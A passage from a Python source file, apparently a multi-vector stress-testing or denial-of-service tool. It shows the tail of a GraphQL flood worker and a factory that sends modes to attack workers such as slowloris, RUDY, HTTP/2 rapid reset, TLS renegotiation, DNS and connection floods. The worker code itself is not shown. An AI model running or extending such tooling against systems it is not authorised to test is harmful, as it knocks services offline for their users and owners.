            _plugin_error(plugins, wid, cfg.url, err)
        stats.record(_rec(wid, cfg.url, "GraphQL", status,
                          (time.perf_counter()-t0)*1000, bin_, len(body_bytes), err))
        await asyncio.sleep(0)


# ── Factory ───────────────────────────────────────────────────────────────────
def make_worker(wid, mode, session, host, port, path,
                stats, cfg, auth=None, tpl=None, phase="main", plugins=None):
    plugins = plugins or []
    m = mode.lower().replace("-","_").replace(" ","_")
    if   m in ("http","http_flood"):              return http_flood(wid,session,cfg,stats,auth,phase,tpl,plugins)
    elif m in ("keepalive","http_keepalive","ka"): return http_keepalive_flood(wid,session,cfg,stats,phase,plugins)
    elif m == "slowloris":                         return slowloris_worker(wid,host,port,path,stats,cfg)
    elif m == "rudy":                              return rudy_worker(wid,host,port,path,stats,cfg)
    elif m in ("slow_read","slowread"):            return slow_read_worker(wid,host,port,path,stats,cfg)
    elif m in ("cache_bypass","cache"):            return cache_bypass_worker(wid,session,stats,cfg)
    elif m in ("range","range_attack"):            return range_attack_worker(wid,session,stats,cfg)
    elif m in ("tls","tls_reneg","tls_renegotiation"):
                                                   return tls_renegotiation_worker(wid,host,port,stats,cfg)
    elif m in ("h2_reset","http2_rapid_reset","rapid_reset","h2"):
                                                   return http2_rapid_reset_worker(wid,session,stats,cfg)
    elif m in ("header_overflow","hdr"):           return header_overflow_worker(wid,session,stats,cfg)
    elif m in ("connection","conn"):               return connection_flood(wid,host,port,stats,cfg)
    elif m == "dns":                               return dns_flood(wid,host,stats,cfg)
    elif m in ("payload","payload_flood"):         return payload_flood(wid,session,stats,cfg)
    elif m == "scenario":                          return scenario_worker(wid,session,stats,cfg,auth,plugins)
    elif m == "chaos":                             return chaos_worker(wid,session,stats,cfg)
    elif m == "mixed":                             return mixed_worker(wid,session,host,port,path,stats,cfg,plugins)
    elif m in ("grpc","grpc_flood"):               return grpc_flood(wid,stats,cfg)
    elif m in ("websocket","ws","websocket_flood"):return websocket_flood(wid,session,stats,cfg,plugins)
    elif m in ("graphql","gql"):                   return graphql_flood(wid,session,stats,cfg,plugins)
    else:                                          return http_flood(wid,session,cfg,stats,auth,phase,tpl,plugins)
